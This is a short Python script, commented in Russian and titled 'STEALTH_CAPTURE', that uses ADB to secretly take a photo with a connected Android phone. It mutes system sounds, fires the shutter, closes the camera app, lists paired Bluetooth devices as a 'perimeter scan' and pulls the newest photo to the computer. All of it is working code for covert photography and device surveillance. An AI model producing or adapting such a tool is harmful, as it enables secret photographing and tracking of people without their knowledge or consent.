import subprocess
import time

# --- STEALTH_CAPTURE v2.0 ---
# Захват фото и сканирование периметра

def run_adb(cmd):
    return subprocess.check_output(f"..\\platform-tools\\adb.exe {cmd}", shell=True).decode('utf-8')

def capture_photo():
    print("[PHOTO] Инициирую скрытый захват...")
    # 1. Mute
    run_adb("shell settings put system volume_system 0")
    # 2. Start Camera in Still Image Mode
    run_adb("shell am start -a android.media.action.STILL_IMAGE_CAMERA")
    time.sleep(3)
    # 3. Trigger Shutter (Key 27 or 66)
    run_adb("shell input keyevent 27")
    time.sleep(2)
    # 4. Close Camera
    run_adb("shell am force-stop com.android.camera")
    run_adb("shell am force-stop com.motorola.camera3")
    print("[PHOTO] Команда выполнена.")

def scan_nearby():
    print("[SCAN] Сканирование Bluetooth-периметра...")
    try:
        # Пытаемся получить список последних подключенных устройств
        devices = run_adb("shell dumpsys bluetooth_manager")
        # Ищем MAC-адреса и имена
        lines = devices.split('\n')
        found = []
        for line in lines:
            if ":" in line and ("[" in line or "Name" in line):
                found.append(line.strip())
        return found[:10] # Топ 10
    except:
        return ["Ошибка сканирования"]

if __name__ == "__main__":
    capture_photo()
    nearby = scan_nearby()
    print("\n[PERIMETER] Обнаруженные устройства в радиусе 3-5м:")
    for d in nearby:
        print(f" > {d}")
    
    # Пытаемся вытянуть последнее фото
    try:
        last_file = run_adb("shell ls -t /sdcard/DCIM/Camera/*.jpg | head -n 1").strip()
        print(f"\n[FILES] Последний файл: {last_file}")
        run_adb(f"pull {last_file} captured_stealth.jpg")
        print("[SUCCESS] Фото успешно вытянуто в captured_stealth.jpg")
    except:
        print("[ERROR] Не удалось найти или скачать новое фото.")
